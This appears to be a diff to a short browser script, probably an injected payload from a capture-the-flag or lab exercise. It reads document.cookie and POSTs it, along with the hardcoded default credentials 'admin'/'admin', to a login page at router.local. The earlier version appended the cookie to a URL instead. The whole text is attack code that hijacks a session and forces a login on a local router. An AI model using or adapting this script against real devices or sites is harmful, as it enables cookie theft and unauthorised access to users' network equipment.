@@ -1,9 +1,9 @@
 const http = new XMLHttpRequest();
-//http.open('POST', 'http://router.local/login.php', true);
+http.open('POST', 'http://router.local/login.php', true);
 //http://router.local/home.php?action=view&
 //http://router.local/view.php
 const cook = document.cookie;
-http.open('POST', 'http://router.local?action=view&'+cook, true);
+//http.open('POST', 'http://router.local?action=view&'+cook, true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
@@ -15,8 +15,8 @@ http.onload = function () {
 
 };
 
-http.send();
-//http.send(cook+"&username=admin&pin=password&notRobot=on");
+//http.send();
+http.send(cook+"&username=admin&pin=admin&notRobot=on");
 
    
 
